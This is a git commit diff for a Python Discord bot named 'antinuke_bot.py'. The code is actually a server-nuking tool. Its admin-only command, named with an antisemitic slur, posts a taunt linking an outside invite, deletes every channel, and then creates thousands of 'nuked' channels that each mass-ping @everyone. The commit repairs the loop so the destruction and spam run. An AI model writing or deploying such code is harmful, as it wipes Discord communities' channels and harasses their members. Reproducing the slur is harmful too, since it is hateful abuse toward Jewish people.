98e485d3c7bc03d5a74549e4ccc964180d148f02
mominali20ff-prog <mominali20ff@gmail.com>
2026-06-13 21:59:33 +0100

    Update antinuke_bot.py

--- antinuke_bot.py
+++ antinuke_bot.py
@@ -3,16 +3,15 @@ from discord.ext import commands
 import os
 
 TOKEN = os.environ["DISCORD_TOKEN"]
-
 intents = discord.Intents.default()
 intents.message_content = True
 intents.guilds = True
-
 bot = commands.Bot(command_prefix=".", intents=intents)
 
 @bot.event
 async def on_ready():
     print(f"Logged in as {bot.user}")
+
 @bot.command()
 @commands.has_permissions(administrator=True)
 async def jew(ctx):
@@ -20,18 +19,21 @@ async def jew(ctx):
 your server got nuked bullshit join this for appeal https://discord.gg/RY5gS7yKdD
 .
 """)
-
     # Delete existing channels
     for channel in ctx.guild.channels:
         try:
             await channel.delete()
         except:
             pass
-
     # Create new channels
-      for i in range(2000, 5000):
-    channel = ...
-    message = """
-    text
-    "@everyone @here @everyone @everyone @everyone @everyone"
-    await channel.send(message)
+    for i in range(2000, 5000):
+        try:
+            channel = await ctx.guild.create_text_channel(f"nuked-{i}")
+            message = """
+@everyone @here @everyone @everyone @everyone @everyone
+"""
+            await channel.send(message)
+        except:
+            pass
+
+bot.run(TOKEN)
